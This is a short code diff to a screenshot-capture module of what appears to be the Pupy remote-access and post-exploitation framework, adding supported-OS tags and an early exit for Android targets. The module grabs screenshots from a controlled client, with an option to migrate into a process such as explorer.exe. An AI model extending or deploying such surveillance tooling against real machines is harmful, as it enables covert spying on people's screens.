@@ -40,8 +40,7 @@ import subprocess
 
 __class_name__="Screenshoter"
 
-
-@config(cat="gather")
+@config(cat="gather",compatibilities=['windows', 'linux', 'darwin'])
 class Screenshoter(PupyModule):
     """ take a screenshot :) """
 
@@ -56,6 +55,9 @@ class Screenshoter(PupyModule):
         self.arg_parser.add_argument('-m', '--migrate', type=str, default='', help='take the screenshot form the point of view of the <process> (ie: C:\\\\windows\\\\explorer.exe)(Do not forget the \\\\)')
 
     def run(self, args):
+        if self.client.is_android()==True:
+            self.error("Android target, not implemented yet...")
+            return ;
         rscreenshot = self.client.conn.modules['screenshot']
         if args.enum:
             self.rawlog('{:>2} {:>9} {:>9}\n'.format('IDX', 'SIZE', 'LEFT'))
